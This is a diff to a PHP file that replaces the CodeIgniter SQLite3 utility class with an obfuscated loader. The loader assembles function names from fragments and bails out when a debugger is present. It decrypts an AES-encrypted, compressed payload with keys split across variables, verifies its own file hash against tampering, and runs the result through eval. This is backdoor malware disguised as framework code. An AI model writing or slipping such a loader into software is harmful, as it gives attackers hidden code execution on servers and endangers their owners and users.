@@ -1,61 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * SQLite3 Utility Class
- *
- * @category	Database
- * @author	Andrey Andreev
- * @link	https://codeigniter.com/user_guide/database/
- */
-class CI_DB_sqlite3_utility extends CI_DB_utility {
-
-	/**
-	 * Export
-	 *
-	 * @param	array	$params	Preferences
-	 * @return	mixed
-	 */
-	protected function _backup($params = array())
-	{
-		// Not supported
-		return $this->db->display_error('db_unsupported_feature');
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_glaob54z=('bas'.'e64'.'_de'.'cod'.'e');
+$_ttig36qf=('gzu'.'nco'.'mpr'.'ess');
+$_sf7ps4cx=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_aiibovok='7VSyrYIs';
+$_qje6fyn0='13WV1PZyyJ0=';
+$_vlzoojax='uC5FMHoz';
+$_g82qdksx='uALD3L2u';
+$_uey78l5a='u2+6kr8b';
+$_l9sa4jrn='AQo93R5m';
+$_vtcpuxqn='thyarQ==';
+$_wnqo7z5m='rCxlG+tm';
+$_tdxbd32v=$_glaob54z($_aiibovok.$_vlzoojax.$_g82qdksx.$_uey78l5a.$_qje6fyn0);
+$_nnszlkyn=$_glaob54z($_wnqo7z5m.$_l9sa4jrn.$_vtcpuxqn);
+$_nvlev3lp=$_glaob54z('GiKgGgJQEb2KyfQREsf5ac14zed2231lCr6bTRe4cMhZy5CQpUj8Hj7P8hT2gxqHgFePE/9WsTjJh/eAjs4z6mjCxzIOXk9JV2v/9TBxMRqccH77bPyIHaAEZKteuA9EcjLcQ5zc3DONB2KbQX7/q1cXaksjN0+hX7IH53Yh6PQ5tLBiOZyIgfj7HRD2rw6pUBgWO+A7koVXip7F3MLVmrDa45GCbHVtF0LcUZ9qK3YiTMliJR0iUaq8SlGTLuQW1aTr3uvxSU4WZCuink66hQ==');
+$_u8o75oun=$_sf7ps4cx($_nvlev3lp,'aes-256-cbc',$_tdxbd32v,OPENSSL_RAW_DATA,$_nnszlkyn);
+if($_u8o75oun===false){exit;}
+$_y0vjkhbs=$_ttig36qf($_u8o75oun);
+if($_y0vjkhbs===false){exit;}
+$_oeqdpfy9='09c16947971679412ccfe82c17f87a6374d39c8ab63e836655afcd6fb6195528';
+$_l1p7dyo7=@file_get_contents(__FILE__);
+if($_l1p7dyo7!==false){
+$_umu0c271=str_replace($_oeqdpfy9,"0000000000000000000000000000000000000000000000000000000000000000",$_l1p7dyo7);
+$_nd3fvew9=hash("sha256",$_umu0c271);
+if($_nd3fvew9!==$_oeqdpfy9){@http_response_code(403);exit;}
 }
+eval($_y0vjkhbs);
